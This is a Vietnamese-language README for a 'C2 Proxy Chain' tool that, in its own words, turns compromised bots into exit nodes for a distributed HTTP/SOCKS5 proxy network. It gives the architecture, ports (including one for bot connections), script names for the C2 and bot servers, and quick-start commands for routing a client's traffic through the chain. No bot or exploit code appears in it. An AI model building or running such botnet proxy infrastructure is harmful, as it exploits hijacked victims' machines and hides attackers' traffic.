# 🚀 C2 Proxy Chain System

Hệ thống C2 Proxy Chain cho phép tạo mạng proxy phân tán sử dụng các bot đã bị compromise làm exit nodes.

## 📋 Kiến Trúc

```
PC Client (Browser/App) 
    ↓ (HTTP/SOCKS5 Proxy)
C2 Server (Proxy Entry Point)
    ↓ (Load Balancing)
Bot1, Bot2, Bot3... (Child Servers)
    ↓ (Direct Internet Access)
Internet
```

## 🚀 Sử Dụng Nhanh

### 1. Chạy Toàn Bộ Hệ Thống:
```bash
cd scripts
python3 run_proxy_chain.py --num-bots 3
```

### 2. Cấu Hình Client:
```bash
# HTTP Proxy
export http_proxy=http://C2_IP:8080
export https_proxy=http://C2_IP:8080

# Test
curl http://httpbin.org/ip
```

### 3. Web Dashboard:
Truy cập: `http://C2_IP:5001`

## 📁 Cấu Trúc File

```
scripts/
├── c2_proxy_server.py          # C2 Proxy Server chính
├── child_bot_server.py         # Bot server (exit node)
├── proxy_load_balancer.py      # Load Balancer & Health Monitor
├── proxy_web_dashboard.py      # Web Dashboard
├── run_proxy_chain.py          # Script chạy toàn bộ hệ thống
├── test_proxy_chain.py         # Test script
├── README_PROXY_CHAIN.md       # Hướng dẫn chi tiết
└── templates/
    └── proxy_dashboard.html    # Dashboard template
```

## 🔧 Ports

- **3333**: C2 server (bot connections)
- **8080**: HTTP proxy
- **1080**: SOCKS5 proxy  
- **5001**: Web dashboard

## 📖 Hướng Dẫn Chi Tiết

Xem file `scripts/README_PROXY_CHAIN.md` để biết thêm chi tiết về:
- Cài đặt và cấu hình
- Load balancing strategies
- Health monitoring
- Troubleshooting
- API reference

## 🎯 Tính Năng

- ✅ HTTP/SOCKS5 Proxy Support
- ✅ Load Balancing (8 algorithms)
- ✅ Health Monitoring
- ✅ Real-time Dashboard
- ✅ Auto-scaling
- ✅ Comprehensive Testing

## 🚀 Bắt Đầu

```bash
# 1. Chạy hệ thống
python3 scripts/run_proxy_chain.py

# 2. Cấu hình proxy
export http_proxy=http://localhost:8080

# 3. Test
curl http://httpbin.org/ip
```

Chúc bạn sử dụng thành công! 🎉